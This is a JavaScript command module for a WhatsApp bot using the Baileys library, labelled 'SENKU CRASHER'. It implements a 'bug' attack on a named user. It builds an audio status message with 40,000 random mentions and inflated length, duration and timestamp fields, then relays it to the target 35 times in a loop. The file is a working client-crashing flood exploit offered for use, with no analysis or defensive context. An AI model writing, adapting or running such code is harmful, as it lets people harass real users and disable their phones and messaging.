import crypto from "crypto";

import pkg from 'baileys';

const { generateWAMessageFromContent } = pkg;


import channelSender from '../commands/channelSender.js'


async function bugs(isTarget, client) {

  const floods = 40000;

  const mentioning = "13135550002@s.whatsapp.net";

  const mentionedJids = [

    mentioning,
    ...Array.from({ length: floods }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";

  const mime = "audio/mpeg", sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=", enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";

  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=", timestamp = 99999999999999;

  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";

  const longs = 99999999999999, loaded = 99999999999999;

  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {

    mentionedJid: mentionedJids,

    isForwarded: true,

    forwardedNewsletterMessageInfo: {

      newsletterJid: "120363321780343299@newsletter",

      serverMessageId: 1,

      newsletterName: "SENKU CRASHER"

    }

  };

  const messageContent = {

    ephemeralMessage: {

      message: {

        audioMessage: {

          url: links,

          mimetype: mime,

          fileSha256: sha,

          fileLength: longs,

          seconds: loaded,

          ptt: true,

          mediaKey: key,

          fileEncSha256: enc,

          directPath: path,

          mediaKeyTimestamp: timestamp,

          contextInfo: messageContext,

          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {

    messageId: msg.key.id,

    statusJidList: [isTarget],

    additionalNodes: [{

      tag: "meta",

      attrs: {},

      content: [{

        tag: "mentioned_users",

        attrs: {},

        content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]

      }]

    }]

  };

  await client.relayMessage("status@broadcast", msg.message, broadcastSend);

}


async function delay (message, client){

 try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {

            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the bug command

        for (let i = 0; i < 35; i++) {

            await bugs(participant, client);;

            await new Promise(resolve => setTimeout(resolve, 1000));

        }

        await channelSender(message, client, "Succceded in sending bug to the target", 4);

    } catch (error) {

        console.error("An error occurred while trying to bug the target:", error);

        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
    }
}

export default delay;